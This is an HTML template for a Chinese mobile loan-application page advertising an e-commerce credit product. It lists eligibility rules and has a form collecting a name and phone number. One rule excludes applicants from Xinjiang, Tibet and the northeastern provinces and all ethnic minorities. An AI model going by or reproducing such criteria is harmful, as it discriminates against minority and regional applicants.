<!DOCTYPE html>

    <link rel="stylesheet" type="text/css" href="./Public/Home/css/loan_base.css">

<body>
<div class="content">
    <div class="titlenav">
        <div class="weui-flex" style="margin-top: 10px;">
            <div class="weui-flex__item">
                <p class="money">额度10000-500000</p>
                <p class="text">有网商贷账户</p>
            </div>
        </div>
    </div>
    <style>

    </style>
    <div class="goods_info">
        <div class="bg">
            <div class="img">
                <img src="./Public/Uploads/dsqb.png" alt="" class="goodsImg" style="width:60px;height:60px">
                <p class="goods_name">电商钱包</p>
            </div>
            <div class="ts">
                <div class="box">
                    <p class="bold">准入标准</p>
                    <p>1、中华人民共和国公民</p>
                    <p>2、年龄18~55周岁</p>
                    <p>3、利息：随借随还 0.1%/日；分期 2.02%/月</p>
                    <p>4、额度：5~50万</p>
                    <p>5、地域：全国（新疆、西藏、东三省不做，少数民族不做）</p>
                    <p>6、网店经营时长≥6个月，月交易额≥3万</p>
                    <p>7、有网商贷使用记录（必须在2018年有使用记录）</p>
                    <p>8、手机号使用必须1年以上</p>
                    <p>9、负债不能超过80%（大数据查询次数1个月不能超5次）</p>
                </div>
                <div class="fixed_box">
                    <form action="infos.php" method="post">
                        <div class="weui-cell form-group">
                            <div class="weui-cell__hd">
                                <label class="weui-label">姓名</label>
                            </div>
                            <div class="weui-cell__bd">
                                <input class="weui-input" name="names" id="name" type="text" placeholder="请输入姓名" required>
                            </div>
                        </div>
                        <div class="weui-cell form-group">
                            <div class="weui-cell__hd">
                                <label class="weui-label">手机号</label>
                            </div>
                            <div class="weui-cell__bd">
                                <input class="weui-input" id="phone" name="phone" type="number" pattern="[0-9]*"
                                       placeholder="请输入手机号" required>
                            </div>
                        </div>
                        <div class="weui-cell form-group">
                            <!--<p style="font-size:12px;color:#e64340">已有13993716人申请</p>-->
                        </div>
                        <div class="weui-flex btn-box">
                            <div class="weui-flex__item">
                                <input type="hidden" value="828983" id="from_user_id"/>
                                <!--  <a href="javascript:;" class="weui-btn weui-btn_primary" id="lijibanli">立即申请</a> -->
                                <input type="submit" class="weui-btn weui-btn_primary" id="lijibanli" value="立即申请">
                            </div>
                        </div>
                        <input type="hidden" name="recommender_id" value="" id="rid">
                        <input type="hidden" name="products" value="电商钱包">
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script>
        $(function () {
            var url = document.URL;
            var mid = url.split("=");
            $("#rid").val(mid[1]);
        })
    </script>
    <script src="Public/Home/js/index.js"></script>
